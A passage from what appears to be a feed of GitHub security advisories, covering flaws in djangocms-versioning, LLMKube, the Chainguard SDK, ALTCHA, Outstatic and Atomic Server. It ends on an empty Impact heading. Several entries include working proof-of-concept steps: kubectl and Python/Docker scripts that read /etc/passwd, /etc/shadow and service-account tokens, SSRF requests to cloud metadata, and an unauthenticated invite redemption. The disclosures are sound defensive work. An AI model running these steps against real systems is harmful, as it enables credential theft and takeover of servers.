Version state transitions are guarded by `Conditions` objects declared on `djangocms_versioning.models.Version`. Every transition that mutates content carries the `user_can_change` condition, which delegates to the *content* object's own permission check (`Version.has_change_permission` → `content.has_change_permission` / `has_placeholder_change_permission`, with a final fallback to the Django `change_<model>` permission).

Two conditions were missing that check:

```python
# Before (vulnerable)
check_discard = Conditions([
    in_state([constants.DRAFT], not_draft_error),
    is_not_locked(lock_error_message),
])
check_edit_redirect = Conditions([
    in_state([constants.DRAFT, constants.PUBLISHED], _("Version is not in draft or published state")),
    draft_is_not_locked(lock_draft_error_message),
])
```

The corresponding admin views authorize **only** through these conditions:

* `VersionAdmin.discard_view` / `VersionAdmin.edit_redirect_view` fetch the  target with the stock `ModelAdmin.get_object`, which is backed by the   **unfiltered** default queryset — no per-user or per-grouper scoping.
* The views are registered with `admin_site.admin_view`, which enforces only  `is_staff`.
* `discard_view` deletes the version directly via `version.delete()` and   never consults `VersionAdmin.has_delete_permission` (which otherwise   delegates to the content admin and honors `ALLOW_DELETING_VERSIONS`).

Because the only per-object gate for these two operations was the `Conditions` list, and that list omitted `user_can_change`, any staff user could invoke the operation on any version by its primary key. The changelist action buttons are disabled in the UI via `check_discard.as_bool` / `check_edit_redirect.as_bool`, but that is a client-side affordance only and does not protect the directly reachable admin URLs.

## Impact

* **Type:** Broken access control / missing authorization (IDOR).
* **Who is affected:** Multi-editor deployments where staff users hold  differentiated per-object permissions.
  * Under `CMS_PERMISSION = True`, authorization for these two operations was   effectively reduced to `is_staff`, so any staff user could discard or    edit-redirect any version.
  * Under the default `CMS_PERMISSION = False`, it degrades to the global    `change_<model>` permission (e.g. `cms.change_page`) — weaker than the  intended per-object check, but not absent.
* **Consequence:** Unauthorized deletion of draft versions and their content objects (integrity/availability of content), and unauthorized creation of drafts from published content.

## Patches

Fixed by adding the `user_can_change` condition to both `check_discard` and `check_edit_redirect`, restoring parity with the other content-mutating transitions:

```python
# After (fixed)
check_discard = Conditions([
    in_state([constants.DRAFT], not_draft_error),
    user_can_change(change_permission_error),
    is_not_locked(lock_error_message),
])
check_edit_redirect = Conditions([
    in_state([constants.DRAFT, constants.PUBLISHED], _("Version is not in draft or published state")),
    user_can_change(change_permission_error),
    draft_is_not_locked(lock_draft_error_message),
])
```

`discard` intentionally requires **change** permission (not delete): it is treated as undoing changes to a draft.

Upgrade to `djangocms-versioning` `2.6.1` or later.

## Workarounds

There is no configuration-only workaround. Operators who cannot upgrade immediately should restrict staff accounts to trusted users, since the missing gate reduces to `is_staff` under `CMS_PERMISSION = True`.

titolo: GHSA-jw3m-8q7m-f35r: LLMKube: Arbitrary Host File Read via Model.spec.source hostPath Injection
descrizione:
### Summary

LLMKube's `ModelReconciler` accepts arbitrary absolute paths and `file://` URIs in the `Model.spec.source` field and propagates them to two distinct sinks without path allowlisting: (1) `os.Open()` inside the controller pod itself (`copyLocalModel`), and (2) a Kubernetes `HostPathVolumeSource` that mounts the attacker-supplied path into the inference pod's init container. Any namespace user with permission to create or update `Model` and `InferenceService` custom resources can read arbitrary files accessible to the controller pod (e.g., the controller's own Kubernetes service-account token) or arbitrary files on the node where the inference pod is scheduled (e.g., `/etc/kubernetes/kubelet.conf`). Model caching, the feature that activates the `hostPath` sink, is **enabled by default** in both the CLI and the official Helm chart. CVSS v3.1 Base Score: **7.7 (High)**.

### Details

**Entry point — `Model.spec.source` field**

The `Source` field in `api/v1alpha1/model_types.go:47-48` carries a `kubebuilder` validation pattern that explicitly permits absolute paths:

```go
// +kubebuilder:validation:Pattern=`^(https?|file|pvc|hf)://.*|^/[^\s]+$|^[a-zA-Z0-9][\w\-\.\/]+$`
Source string `json:"source"`
```

The branch `^/[^\s]+$` matches any non-whitespace absolute path on the host.

**Sink 1 — Controller-pod arbitrary file read (`copyLocalModel`)**

`internal/controller/source.go:93-103` classifies a source as local and extracts the path with no sanitization:

```go
// isLocalSource: returns true for any "/" prefix or "file://" prefix
func isLocalSource(source string) bool {
    return strings.HasPrefix(source, "/") || strings.HasPrefix(source, "file://")
}

// getLocalPath: strips "file://" prefix only; no canonicalization, no allowlist
func getLocalPath(source string) string {
    return strings.TrimPrefix(source, "file://")
}
```

`internal/controller/model_controller.go:241` passes the attacker-controlled source into `fetchModel`, which reaches `copyLocalModel` at line 664-667:

```go
f, err := os.Open(localPath)   // localPath = getLocalPath(model.Spec.Source)
```

An attacker sets `model.spec.source: /var/run/secrets/kubernetes.io/serviceaccount/token`; the controller opens its own SA token and writes it to the model-cache PVC, which the attacker can subsequently read.

**Sink 2 — Node arbitrary file read via `HostPathVolumeSource`**

`internal/controller/model_storage.go:560-568` converts the same path into a Kubernetes host volume with no canonical-root check:

```go
if isLocalModelSource(model.Spec.Source) {
    localPath := getLocalPath(model.Spec.Source)
    volumes = append(volumes, corev1.Volume{
        Name: "host-model",
        VolumeSource: corev1.VolumeSource{
            HostPath: &corev1.HostPathVolumeSource{
                Path: localPath,
                Type: func() *corev1.HostPathType { t := corev1.HostPathFile; return &t }(),
            },
        },
    })
    initVolumeMounts = append(initVolumeMounts, corev1.VolumeMount{
        Name:      "host-model",
        MountPath: "/host-model/model.gguf",
        ReadOnly:  true,
    })
}
```

`internal/controller/deployment_builder.go:248-250` calls `buildModelStorageConfig`, and lines 329-333 embed `storageConfig.volumes` directly into the generated `Deployment`'s `PodSpec`. When the inference pod starts, the init container copies the node file to the model-cache PVC.

The only filename-level sanitization is in `internal/controller/filename.go:44-75`, which constrains the **destination basename** only and has no effect on `HostPath.Path`.

Model caching is enabled by default: `cmd/main.go:120` and `charts/llmkube/values.yaml:274` (`modelCache.enabled: true`).

### PoC

**Prerequisites**

- LLMKube 0.8.27 or 0.8.28 installed with default Helm values (`modelCache.enabled=true`).
- Attacker possesses `create`/`update` permissions for `Model` and `InferenceService` CRDs in a target namespace, plus `get` on Pod logs.

**Path A — Live Kubernetes cluster (hostPath sink)**

```sh
NS=llmkube-poc
kubectl create ns "$NS"

# Step 1: Create a Model whose source points to a sensitive node file
cat <<'YAML' | kubectl apply -n "$NS" -f -
apiVersion: inference.llmkube.dev/v1alpha1
kind: Model
metadata:
  name: hostread
spec:
  source: /etc/passwd
YAML

kubectl wait -n "$NS" --for=jsonpath='{.status.phase}'=Ready \
    model/hostread --timeout=180s

CACHEKEY="$(kubectl get model hostread -n "$NS" \
    -o jsonpath='{.status.cacheKey}')"
BASENAME="$(basename \
    "$(kubectl get model hostread -n "$NS" -o jsonpath='{.status.path}')")"

# Step 2: Create an InferenceService that prints the copied file
cat <<YAML | kubectl apply -n "$NS" -f -
apiVersion: inference.llmkube.dev/v1alpha1
kind: InferenceService
metadata:
  name: hostread
spec:
  modelRef: hostread
  runtime: llamacpp
  image: busybox:1.36
  command: ["sh","-c","cat /models/${CACHEKEY}/${BASENAME}; sleep 3600"]
YAML

# Step 3: Retrieve the exfiltrated file
kubectl logs -n "$NS" deploy/hostread -c llama-server
```

Expected output — contents of `/etc/passwd` from the node:

```
root:x:0:0:root:/root:/bin/bash
...
```

**Variant — controller SA token (copyLocalModel sink)**

```sh
cat <<'YAML' | kubectl apply -n "$NS" -f -
apiVersion: inference.llmkube.dev/v1alpha1
kind: Model
metadata:
  name: satoken
spec:
  source: /var/run/secrets/kubernetes.io/serviceaccount/token
YAML
# After the model becomes Ready, its cache entry contains the raw JWT.
```

**Path B — Docker-only reproduction (no live cluster)**

This path exercises the `copyLocalModel` / `os.Open` sink using verbatim copies of `isLocalSource()` and `getLocalPath()` from `internal/controller/source.go:93-103`.

```sh
# Build from the parent directory of vuln-001/
docker build --no-cache -f vuln-001/Dockerfile -t llmkube-vuln001-poc .

# Read /etc/shadow from inside the container (simulates controller pod filesystem)
docker run --rm -e VULN001_TARGET=/etc/shadow llmkube-vuln001-poc

# Or use the Python driver
python3 vuln-001/poc.py --target /etc/shadow
```

Expected output:

```
os.Open SUCCESS — 104 bytes read from /etc/shadow
root:*:19800:0:99999:7:::
daemon:*:19800:0:99999:7:::
llmkube-sa:$6$salt$examplehash:19800:0:99999:7:::
VULN-001 PASS: arbitrary file read confirmed
```

**Phase 2 dynamic verification result**

Both `/etc/shadow` (104 bytes) and `/var/run/secrets/kubernetes.io/serviceaccount/token` (430 bytes, raw JWT) were successfully read inside the container, and the `HostPathVolumeSource` JSON was confirmed to be generated with the attacker-supplied path.

### Impact

This is a **Path Traversal / Arbitrary File Read** vulnerability (CWE-22). It affects any Kubernetes cluster running LLMKube with default settings.

**Who is impacted:**

- **Cluster operators and tenants** — A low-privileged namespace user who can write `Model` and `InferenceService` CRDs (the default RBAC posture for LLMKube users) can escalate to reading the controller's Kubernetes SA token and using it to list/get Secrets cluster-wide, pivot to other namespaces, or impersonate service accounts.
- **Node security boundary** — Via the `hostPath` sink, an attacker can read any file present on the Kubernetes node at pod-scheduling time, including kubeadm certificates (`/etc/kubernetes/pki/`), kubelet credentials (`/etc/kubernetes/kubelet.conf`), and container runtime sockets.
- **Confidentiality** — High (arbitrary read of host and controller secrets). Integrity and Availability are not directly affected.

The vulnerability is network-reachable (attacker talks to the Kubernetes API server), requires low privilege (namespaced CRD write only), needs no user interaction, and impacts resources beyond the attacker's own namespace (changed scope).

### Reproduction artifacts

#### `Dockerfile`

```dockerfile
# VULN-001 PoC — Arbitrary File Read via Model.spec.source (LLMKube CWE-22)
#
# Strategy: compile a standalone Go harness that contains verbatim copies of
# the three vulnerable functions from the LLMKube repository and proves that
# supplying an absolute path as Model.spec.source causes os.Open() to read
# arbitrary files — identical to what copyLocalModel() does at runtime.
#
# Verified against LLMKube commit b9127e0 (tag 0.8.28):
#   isLocalSource()   internal/controller/source.go:93-94
#   getLocalPath()    internal/controller/source.go:98-103
#   os.Open(path)     internal/controller/model_controller.go:667
#   HostPath volume   internal/controller/model_storage.go:560-575
#
# Build context: parent directory of vuln-001/
#   docker build -f vuln-001/Dockerfile -t llmkube-vuln001 .
# Run:
#   docker run --rm -e VULN001_TARGET=/etc/shadow llmkube-vuln001

# ── Build stage ────────────────────────────────────────────────────────────────
FROM golang:1.24-bookworm AS builder

WORKDIR /build

# Copy the exploit harness (standalone module, no k8s dependencies)
COPY vuln-001/exploit/ /build/

# Build the exploit binary
RUN go build -o /poc ./...

# ── Verification stage: prove the functions are verbatim copies ──────────────
# Extract the actual source lines from the LLMKube repo and display them next
# to the exploit harness so the diff is zero (aside from package and imports).
COPY repo/internal/controller/source.go /tmp/source.go

RUN echo "=== Verification: LLMKube source.go lines 93-103 ===" && \
    sed -n '93,103p' /tmp/source.go && \
    echo "" && \
    echo "=== Exploit harness verbatim copies (main.go) ===" && \
    grep -A3 "isLocalSource\|getLocalPath" /build/main.go | head -20

# ── Runtime stage ──────────────────────────────────────────────────────────────
FROM debian:bookworm-slim

COPY --from=builder /poc /poc

# Populate /etc/shadow with realistic content so the PoC has a sensitive target
# (simulating the LLMKube controller pod's own filesystem).
RUN printf 'root:*:19800:0:99999:7:::\ndaemon:*:19800:0:99999:7:::\nllmkube-sa:$6$salt$examplehash:19800:0:99999:7:::\n' \
    > /etc/shadow && chmod 640 /etc/shadow

# Also create a simulated SA token (as exists at this path in Kubernetes pods)
RUN mkdir -p /var/run/secrets/kubernetes.io/serviceaccount && \
    printf 'eyJhbGciOiJSUzI1NiIsImtpZCI6ImZha2Uta2lkIn0..FAKE_SIGNATURE\n' \
    > /var/run/secrets/kubernetes.io/serviceaccount/token

# Default target; override at runtime with -e VULN001_TARGET=<path>

ENTRYPOINT ["/poc"]
CMD []
```

#### `poc.py`

```python
#!/usr/bin/env python3
"""
VULN-001 PoC: Arbitrary File Read via Model.spec.source hostPath Injection
LLMKube (github.com/defilantech/LLMKube) — CWE-22 / CVSS 7.7

Vulnerability summary:
  LLMKube's ModelReconciler calls fetchModel(model.Spec.Source, dest).
  When source is a local path (absolute or file://), copyLocalModel() opens
  the file with os.Open(getLocalPath(source)) without any path allowlisting.
  An attacker who can write a Model CR can read any file accessible to the
  controller pod — including SA tokens, kubeconfig, TLS keys, etc.

  Relevant code:
    internal/controller/source.go:93   isLocalSource()  — no allowlist
    internal/controller/source.go:98   getLocalPath()   — strips file://, no sanitization
    internal/controller/model_controller.go:667  os.Open(localPath)  — sink

  In full-cluster scenarios, model_storage.go:560-568 also injects the
  attacker-supplied path directly into a Kubernetes HostPathVolumeSource,
  exposing arbitrary node files inside the init container.

This PoC exercises attack path 2 (copyLocalModel) in Docker without a live
Kubernetes cluster by running a Go test that calls the REAL LLMKube functions.

Usage:
  python3 poc.py [--target /path/to/sensitive/file] [--keep]

Safety constraints:
  - Uses only local Docker (127.0.0.1), no external network calls.
  - Reads only files inside the ephemeral container filesystem.
  - Does not modify any LLMKube source code to manufacture the vulnerability.
"""

import argparse
import json
import os
import subprocess
import sys
import textwrap

IMAGE_NAME = "llmkube-vuln001-poc"
VULN_DIR = os.path.dirname(os.path.abspath(__file__))
BUILD_CONTEXT = os.path.dirname(VULN_DIR)  # parent of vuln-001/
DOCKERFILE = os.path.join(VULN_DIR, "Dockerfile")


def run(cmd, check=True, capture=False, **kwargs):
    """Run a shell command and return CompletedProcess."""
    print(f"[+] {' '.join(cmd)}")
    result = subprocess.run(
        cmd,
        capture_output=capture,
        text=True,
        **kwargs,
    )
    if check and result.returncode != 0:
        stderr = result.stderr or ""
        raise RuntimeError(
            f"Command failed (exit {result.returncode}):\n{stderr[:2000]}"
        )
    return result


def build_image():
    """Build the PoC Docker image."""
    print("\n=== [PHASE 1] Building Docker image ===")
    run([
        "docker", "build",
        "--no-cache",
        "-f", DOCKERFILE,
        "-t", IMAGE_NAME,
        BUILD_CONTEXT,
    ])
    print(f"[+] Image '{IMAGE_NAME}' built successfully.")


def run_poc(target: str) -> str:
    """Run the PoC container and return stdout."""
    print(f"\n=== [PHASE 2] Running PoC against target: {target!r} ===")
    result = run(
        [
            "docker", "run", "--rm",
            "-e", f"VULN001_TARGET={target}",
            IMAGE_NAME,
        ],
        capture=True,
        check=False,
    )
    combined = result.stdout + result.stderr
    print(combined)
    return combined, result.returncode


def parse_evidence(output: str, target: str) -> dict:
    """Extract key evidence markers from PoC output."""
    lines = output.splitlines()
    exfil_lines = []
    in_block = False
    bytes_read = None
    step3_ok = False
    pass_line = None

    for line in lines:
        if f"--- BEGIN EXFILTRATED FILE: {target} ---" in line:
            in_block = True
            continue
        if "--- END EXFILTRATED FILE ---" in line:
            in_block = False
            continue
        if in_block:
            exfil_lines.append(line)
        if "os.Open SUCCESS" in line and "bytes" in line:
            step3_ok = True
            # Extract byte count — format: "os.Open SUCCESS — N bytes read from ..."
            import re
            m = re.search(r"(\d+)\s+bytes\s+read", line)
            if m:
                try:
                    bytes_read = int(m.group(1))
                except ValueError:
                    pass
        if "VULN-001 PASS:" in line:
            pass_line = line

    return {
        "step3_open_success": step3_ok,
        "bytes_read": bytes_read,
        "exfiltrated_lines": exfil_lines[:10],  # first 10 lines as evidence
        "pass_line": pass_line,
    }


def remove_image():
    """Remove the PoC Docker image."""
    subprocess.run(["docker", "rmi", "-f", IMAGE_NAME],
                   capture_output=True, text=True)
    print(f"[+] Image '{IMAGE_NAME}' removed.")


def main():
    parser = argparse.ArgumentParser(
        description="VULN-001 dynamic reproduction PoC for LLMKube"
    )
    parser.add_argument(
        "--target", default="/etc/shadow",
        help="File path to read inside the container (default: /etc/shadow)"
    )
    parser.add_argument(
        "--keep", action="store_true",
        help="Keep the Docker image after the run (default: remove)"
    )
    parser.add_argument(
        "--output", default=os.path.join(VULN_DIR, "phase2_result.json"),
        help="Path to write phase2_result.json"
    )
    args = parser.parse_args()

    build_command = (
        f"docker build --no-cache -f {DOCKERFILE} -t {IMAGE_NAME} {BUILD_CONTEXT}"
    )
    run_command = (
        f"docker run --rm -e VULN001_TARGET={args.target} {IMAGE_NAME}"
    )
    poc_command = f"python3 {os.path.abspath(__file__)} --target {args.target}"

    passed = False
    verdict = "FAIL"
    reason = ""
    evidence = ""

    try:
        build_image()
        output, returncode = run_poc(args.target)
        ev = parse_evidence(output, args.target)

        if returncode == 0 and ev["step3_open_success"] and ev["bytes_read"]:
            passed = True
            verdict = "PASS"
            exfil_preview = "\n".join(ev["exfiltrated_lines"][:5]) or "(binary data)"
            reason = (
                f"LLMKube copyLocalModel()이 Model.spec.source={args.target!r} 값을 "
                f"경로 허용목록 검사 없이 os.Open()에 전달함. "
                f"isLocalSource()와 getLocalPath() 실함수 호출로 재현됨. "
                f"컨테이너 내 {ev['bytes_read']}바이트 파일 읽기 성공."
            )
            evidence = (
                f"os.Open({args.target!r}) 성공 — {ev['bytes_read']}바이트 읽음.\n"
                f"파일 내용 앞 5행:\n{exfil_preview}"
            )
        else:
            reason = (
                f"PoC 컨테이너 종료 코드 {returncode}. "
                f"os.Open 성공 여부: {ev['step3_open_success']}, "
                f"읽은 바이트: {ev['bytes_read']}. "
                f"실행 로그를 확인하여 오류 원인 파악 필요."
            )
            evidence = output[:1000]

    except Exception as exc:
        reason = f"재현 실패 — 예외 발생: {exc}"
        evidence = str(exc)
        print(f"\n[!] ERROR: {exc}", file=sys.stderr)

    finally:
        if not args.keep:
            remove_image()

    result = {
        "passed": passed,
        "verdict": verdict,
        "reason": reason,
        "build_command": build_command,
        "run_command": run_command,
        "poc_command": poc_command,
        "evidence": evidence,
        "artifacts": ["Dockerfile", "poc.py", "exploit/main.go", "exploit/go.mod"],
    }

    print("\n=== [RESULT] ===")
    print(json.dumps(result, ensure_ascii=False, indent=2))

    with open(args.output, "w", encoding="utf-8") as fh:
        json.dump(result, fh, ensure_ascii=False, indent=2)
    print(f"\n[+] Result written to: {args.output}")

    sys.exit(0 if passed else 1)


if __name__ == "__main__":
    main()
```

titolo: GHSA-wq26-3j2m-4hvv: Chainguard SDK: AWS SigV4 token replay in auth/aws.VerifyToken — Chainguard-Audience/Chainguard-Identity binding headers not required in SignedHeaders
descrizione:
### Summary

The `auth/aws` package of the `chainguard.dev/sdk` Go library provides Chainguard's AWS-backed identity federation (an AWS workload proves its identity to Chainguard by signing an AWS STS `GetCallerIdentity` request). Its verifier, `VerifyToken`, reads the `Chainguard-Audience` and `Chainguard-Identity` binding headers from a presented token but does not require them to be covered by the SigV4 signature. AWS STS validates only the headers listed in `SignedHeaders` and ignores all others, so an attacker can take a `GetCallerIdentity` request that a victim signed for a *different* relying party, inject or rewrite those two headers *after* signing (without invalidating the signature), and replay it to any service that authenticates callers with `VerifyToken`. The binding those headers were meant to provide is therefore forgeable — a verifier-side (relying-party) authentication bypass / cross-service token replay.

### Background

The package uses the standard "signed `GetCallerIdentity`" pattern — the same approach HashiCorp Vault's AWS auth method and Kubernetes `aws-iam-authenticator` use: the caller signs an AWS STS `GetCallerIdentity` request with its AWS credentials to prove who it is, and presents that signed request as a bearer token. It has two halves:

- `GenerateToken` (client): builds the `GetCallerIdentity` request, adds the `Chainguard-Audience` and `Chainguard-Identity` headers that bind the proof to a specific Chainguard audience (issuer) and assumable identity, SigV4-signs it, and serializes it into a token.
- `VerifyToken` (relying party): decodes the token, checks those two binding headers, forwards the request to AWS STS to confirm the caller's real AWS identity (ARN), and returns it so a Chainguard token can be issued for that identity.

The binding headers exist so a proof minted for one audience/identity cannot be reused for another — a defense against cross-service replay — and their security depends entirely on being covered by the SigV4 signature.

### Impact

A relying party calling `auth/aws.VerifyToken` can be induced to accept a `GetCallerIdentity` proof that a victim produced for an unrelated purpose — for example a request minted for HashiCorp Vault's AWS auth method, Kubernetes `aws-iam-authenticator`, a different audience, or one captured from logs or a proxy — and to treat it as proof of the victim's AWS identity for an attacker-chosen audience and identity. The signed request is valid within its ~15-minute window. No access to the victim's AWS credentials is required; the attacker only needs a fresh signed `GetCallerIdentity` request from the victim principal.

Code that uses only `auth/aws.GenerateToken` (token generation) is not affected — the generator correctly includes the binding headers in the signature. Only verifiers using `auth/aws.VerifyToken` are affected.

### Affected versions

All released versions of `chainguard.dev/sdk` that include `auth/aws.VerifyToken`, up to and including `v0.1.106`.

### Patches

Fixed in `chainguard.dev/sdk` [v0.1.107](https://github.com/chainguard-dev/sdk/releases/tag/v0.1.107). The fix requires both the `Chainguard-Audience` and `Chainguard-Identity` headers to be present in the request's SigV4 `SignedHeaders` before their values are trusted (mirroring the mitigation HashiCorp Vault applies by requiring `X-Vault-AWS-IAM-Server-ID` to be signed). It additionally adds defense-in-depth checks on the request method, the STS host, and the request timestamp. Upgrade to v0.1.107 or later.

### Workarounds

There is no client-side workaround; the fix is in the verifier. Operators of services that verify AWS-backed identities with `VerifyToken` should upgrade as soon as the patched release is available.

### References

- AWS Signature Version 4 — signed headers: https://docs.aws.amazon.com/IAM/latest/UserGuide/reference_sigv.html
- Comparable mitigation: HashiCorp Vault requires the `X-Vault-AWS-IAM-Server-ID` header to appear in `SignedHeaders` before trusting it.

### Credits

Reported by Kris Kennaway (Datadog).

titolo: GHSA-82w8-65qw-gch6: ALTCHA PHP: verifySolution bypasses HMAC signature check when challenge signature is absent
descrizione:
In altcha-org/altcha v2, the verifySolution method skips HMAC signature verification when the signature field is absent from the challenge payload, even when hmacSignatureSecret is configured.

An attacker who strips the signature key from the challenge JSON passes the condition as false, bypassing tamper-detection entirely. The PoW solution check then runs against unverified parameters — allowing an attacker to self-issue a low-difficulty challenge, solve it trivially, and submit a payload that verifies as true.

Impact:
Complete CAPTCHA bypass on any deployment that sets hmacSignatureSecret (the recommended production configuration).

Fix:
The check was split so that a missing signature is explicitly rejected when a secret is configured.

titolo: GHSA-7jvc-9xq8-frff: Outstatic: Authenticated GitHub REST proxy can send OAuth token to non-GitHub origins
descrizione:
### Impact
Outstatic’s authenticated GitHub REST proxy accepted an unvalidated endpoint parameter and constructed an upstream GitHub API URL by string concatenation while attaching the authenticated user’s GitHub OAuth token.

A user with access to the Outstatic dashboard could craft a request that caused the server to send their own GitHub OAuth token to a non-GitHub host. If that token was captured, it could be used to access GitHub resources available to that same user, including private repositories depending on granted scopes.

This does not allow unauthenticated attackers to access private repository data, and it does not directly expose another user’s GitHub token without an additional same-origin execution or request-forging primitive.

### Patches
The issue has been patched by validating that proxied requests resolve to the exact https://api.github.com/ origin and by restricting forwarded request headers.

Users should upgrade to v2.2.1 or later.

### Workarounds
If upgrading immediately is not possible, restrict access to /api/outstatic/github to trusted dashboard users only, or temporarily disable the endpoint if it is not needed.

As a temporary code-level mitigation, reject body-provided endpoint values that do not begin with /, verify the parsed URL origin is exactly https://api.github.com/, and block forwarding of sensitive headers such as Authorization, Host, and User-Agent.

Users who suspect their token was exposed should revoke the affected GitHub OAuth authorization and sign in again.

titolo: GHSA-ff87-73jp-f3v4: Atomic Server: Unauthenticated full-response SSRF in Atomic-Server /bookmark endpoint
descrizione:
## Summary

Atomic-Server exposes a `GET /bookmark` endpoint that fetches an attacker-supplied URL server-side, parses the response, and reflects the fetched content back to the caller. The endpoint requires no authentication and performs no authorization of its own, and the underlying fetch helper applies no allow-list or private-IP deny-list. An unauthenticated attacker with network reach to the server can force it to issue arbitrary outbound HTTP GET requests to internal-only hosts (loopback services, internal admin panels, link-local cloud-metadata) and read the response body back. This is a full-response SSRF, not a blind one.

## Root cause (source trace)

1. The bookmark endpoint is registered unconditionally for every server: `server/src/appstate.rs:69` (`store.add_endpoint(plugins::bookmark::bookmark_endpoint())`).
2. An unauthenticated caller on the standard GET route becomes `ForAgent::Public`: `server/src/helpers.rs:168-183` (`get_client_agent`).
3. In `get_resource_extended`, when the subject matches an endpoint path the function returns via `call_endpoint` BEFORE the `hierarchy::check_read` authorization call: `lib/src/db.rs:1010-1017` (`if is_endpoint { return self.call_endpoint(...) }`, and `check_read` sits just after at :1017, never reached).
4. `call_endpoint` performs no authorization itself; it only matches the path and invokes the handler: `lib/src/db.rs:662-706`.
5. The bookmark handler discards the caller (`for_agent: _`) and fetches the `url` query parameter directly: `server/src/plugins/bookmark.rs:45-76` (`let content = fetch_data(&path)?;`).
6. `fetch_body` validates only `url.starts_with("http")`: `lib/src/client/helpers.rs:78-91`. A repo-wide grep finds no `is_loopback` / `is_private` / `127.0.0.1` / `169.254` / `localhost` deny-list anywhere in `lib/src` or `server/src`, and no host allow-list.
7. The fetched body is HTML-parsed and written into the resource `name`, `description`, `image` and `preview` (markdown) fields, which are returned to the caller: `server/src/plugins/bookmark.rs:79-110`. This is what makes it a full-response (not blind) SSRF; even plaintext internal responses are wrapped into the preview markdown.

## Proof of concept (unauthenticated)

```
GET /bookmark?url=http://127.0.0.1:<internal-port>/&name=x        # internal loopback service
GET /bookmark?url=http://169.254.169.254/latest/meta-data/&name=x # IMDSv1 cloud metadata
```

No authentication headers. The returned resource reflects the fetched content in its `name` / `description` / `preview` fields, so the attacker reads the internal target's response body.

## Proof of omission

The endpoint-dispatch path returns at `lib/src/db.rs:1011` (`return self.call_endpoint(...)`) before the `check_read` call at `:1017`, and there is no authorization inside `call_endpoint` (`:662-706`). The handler discards the caller (`for_agent: _`, `bookmark.rs:49`), so the endpoint can never enforce per-agent access. `fetch_body` validates only `url.starts_with("http")` (`helpers.rs:83`); no loopback/private/link-local deny-list exists anywhere in the source. No corresponding SSRF/security entry exists in CHANGELOG.md.

## Impact

An unauthenticated attacker with network reach to the server can:
- read internal-only HTTP services not exposed to the internet (admin panels, dashboards, unauthenticated microservices on loopback or the private network);
- read cloud metadata reachable via plain GET (IMDSv1 and similar), enabling potential credential disclosure in affected deployments;
- enumerate internal services / ports from the server's vantage point via differing timeout/error behaviour.

Because the response body is reflected, this is a high-value full-response SSRF. The only precondition is network reach to the server.

Severity: High, CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N = 8.6.

Honest caveats (do not refute the finding): the `ureq` client uses a 2-second timeout, which limits slow targets; AWS IMDSv2 requires a PUT token, so plain GET metadata retrieval may fail there. IMDSv1 and any internal HTTP service or admin panel that answers a plain GET remain fully reachable and reflected.

## Remediation

Add a central SSRF guard inside `fetch_body` (`lib/src/client/helpers.rs`): resolve the target host and reject loopback, link-local, RFC1918 private, CGNAT and unique-local ranges, and reject non-http(s) schemes. Re-validate after DNS resolution (to prevent DNS-rebinding) and after each redirect hop. Enforce authorization on endpoint dispatch: run `check_read` (or a per-endpoint policy) for outbound-fetching endpoints instead of short-circuiting before it at `lib/src/db.rs:1010-1012`, and at minimum require an authenticated, authorized agent for `/bookmark`. Optionally add an operator-configurable allow-list of fetchable hosts.

## Dedup

- atomicdata-dev/atomic-server GitHub Security Advisories: no published advisories (re-verified 2026-07-03). No CVE/GHSA for atomic-server SSRF / the /bookmark endpoint.
- Source re-verified on current `develop` 2026-07-03: the handler still discards the caller (`for_agent: _`) and calls `fetch_data(url)`, and `fetch_body` still validates only `url.starts_with("http")` with no private-IP deny-list (still vulnerable).

## Credit / disclosure

Reported by Ray Sabee, Whitehat Security (https://whitehatsecurity.nl/), GitHub @raysabee. Please credit "Ray Sabee / Whitehat Security / whitehatsecurity.nl" on the advisory and in any release notes. Coordinated disclosure: nothing will be published before a fix is available.

Note: two related findings exist in the same repo and can be handled in this advisory or alongside it: F-ATOMIC-SSRF-002 (a blind pre-auth SSRF in `POST /import` via the SAME `fetch_body` root cause, so one central fix covers both) and F-ATOMIC-LFI-001 (authenticated path-traversal file read in `GET /download`, a separate sink in `download.rs`).

titolo: GHSA-pfwx-xjp4-qxcj: Atomic Server: Unauthenticated `/setup` invite grants write access to the entire Drive
descrizione:
## Summary

atomic-server provisions a well-known invite at `{server}/setup` with `write = true`, `target` = the Drive root, and `usagesLeft = 1`. Invite redemption **ignores the redeemer's identity** (`for_agent: _` in `server/src/plugins/invite.rs:22`), so possession of the URL is the only requirement. An **unauthenticated** attacker who sends `GET /setup?public-key=<attacker_key>` has the server create a new Agent and grant it **write access to the entire Drive**. On a freshly deployed (not-yet-claimed) instance this is a full server takeover with no credentials.

## Severity

**Critical — CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H (9.8).** No authentication required; grants attacker-controlled write over all resources in the Drive.

## Affected component

- `server/src/appstate.rs` — creates the `/setup` invite targeting the Drive root with `write=true`, `usagesLeft=1`.
- `server/src/plugins/invite.rs:14-173` — `construct_invite_redirect` destructures `for_agent: _` (redeemer identity discarded); `?public-key=` → `Agent::new_from_public_key` → `add_rights(agent, target, write=true)`.

## Steps to Reproduce

Environment: `joepmeneer/atomic-server:develop` in Docker, `http://localhost:9883`, fresh store. No auth headers are used.

1. Confirm the invite is live — `GET /setup` (Accept: `application/ad+json`) shows `invite/write = true`, `invite/target = http://localhost:9883` (Drive root), `usagesLeft = 1`.

2. Redeem it anonymously with an attacker-generated ed25519 public key:

```http
GET /setup?public-key=q2UkizMX0Go4mHwW2BXepqkzpP5FHlagEft8M32t0EM%3D HTTP/1.1
Host: localhost:9883
Accept: application/ad+json
```

Response `200 OK` returns a `Redirect` confirming the new agent:

```json
{
  "https://atomicdata.dev/properties/invite/redirectAgent":
      "http://localhost:9883/agents/q2UkizMX0Go4mHwW2BXepqkzpP5FHlagEft8M32t0EM=",
  "https://atomicdata.dev/properties/isA": ["https://atomicdata.dev/classes/Redirect"]
}
```

3. `GET /` shows the attacker is now in the Drive's `write` array:

```json
"https://atomicdata.dev/properties/write": [
  "http://localhost:9883/agents/+/KwsAmyzc7S/...",                        // legit root
  "http://localhost:9883/agents/q2UkizMX0Go4mHwW2BXepqkzpP5FHlagEft8M32t0EM="  // ATTACKER
]
```

4. The attacker signs a normal Commit (ed25519 over the JCS-canonical commit) and `POST /commit` (200) — the Drive root was successfully edited. Write access proven.

**Expected:** `/setup` must require operator authentication / a one-time secret.
**Actual:** Any unauthenticated client on the network redeems it and gains Drive-wide write.

## Impact

